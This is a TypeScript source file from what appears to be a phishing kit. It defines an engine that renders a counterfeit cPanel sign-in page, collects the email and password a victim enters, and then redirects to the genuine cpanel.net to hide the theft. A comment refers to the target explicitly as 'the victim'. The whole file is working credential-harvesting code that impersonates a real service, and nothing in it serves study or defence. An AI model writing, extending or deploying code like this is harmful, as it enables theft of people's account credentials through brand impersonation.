import { parseCredentialFields, type EngineCapture } from "@chameleon/contracts";
import { render as renderSkeleton } from "@chameleon/skeleton";
import type { Engine } from "./types";

/**
 * Static render. Captures credentials only: no OTP field is ever rendered, because
 * the provider never sends the victim a code (INV-CAP-04).
 */
export const chameleon: Engine = {
  code: "chameleon",
  captureKinds: ["credential"],
  defaultKind: "credential",

  async resolve() {
    // Stage 6 replaces this with pin → brand map → profile → cpanel.
    return {
      source: "cpanel",
      brandSlug: "cpanel",
      stepCount: 1,
      step: 1,
      prefilledEmail: null,
      redirectTo: "https://cpanel.net/",
    };
  },

  async render(template) {
    return renderSkeleton({
      brandSlug: template.brandSlug,
      title: template.brandSlug,
      heading: "Sign in",
      emailLabel: "Email",
      passwordLabel: "Password",
      submitLabel: "Sign in",
      palette: {
        bg: "#f4f4f5",
        surface: "#ffffff",
        fg: "#18181b",
        accent: "#ff6c2f",
        radius: "6px",
        font: "system-ui, sans-serif",
      },
      logoRef: null,
      backdropRef: null,
      prefilledEmail: template.prefilledEmail,
      stepCount: template.stepCount,
      step: template.step,
      token: "unset",
      kind: "credential",
    });
  },

  parseCapture(form): EngineCapture {
    const fields = parseCredentialFields({
      username: form.email ?? form.username,
      password: form.password,
    });
    return { kind: "credential", fields };
  },

  redirectTarget(template) {
    return template.redirectTo;
  },
};
